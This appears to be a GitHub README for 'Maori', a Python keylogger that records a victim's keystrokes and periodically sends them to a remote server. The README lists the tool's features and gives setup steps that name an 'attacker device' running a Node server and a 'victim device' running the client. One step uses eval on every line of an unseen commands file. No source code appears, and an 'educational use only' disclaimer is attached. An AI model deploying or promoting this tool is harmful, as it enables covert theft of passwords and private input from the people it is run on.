# Maori

Maori is a Python-based keylogger tool designed to capture keystrokes and send them to a remote server at regular intervals. This tool is intended for ethical hacking and educational purposes only. Misuse of this tool for illegal activities is strictly prohibited.

## Features

- Captures keystrokes and stores them in a variable.
- Sends the captured keystrokes to a specified server at regular intervals.
- Handles various key events, including enter, tab, space, shift, ctrl, alt, backspace, and esc.

## Installation

- **Clone the repository:**
  ```bash
  git clone https://github.com/z33phyr/Maori
  ```

- **Install the necessary libraries:**
  ```bash
  pip3 install pynput requests
  ```

- **Run the commands in the commands.txt:**
  ```bash
  while IFS= read -r command; do eval "$command"; done < commands.txt
  ```

- **On the attacker device run the server:**
  ```bash
  node server.js
  ```

- **On the victim device configure the script and run the script:**
  ```bash
  python3 client.py
  ```

## Disclaimer

This tool is intended for educational and ethical hacking purposes only. Unauthorized use of this tool for illegal activities is strictly prohibited.

## Author

Z33phyr
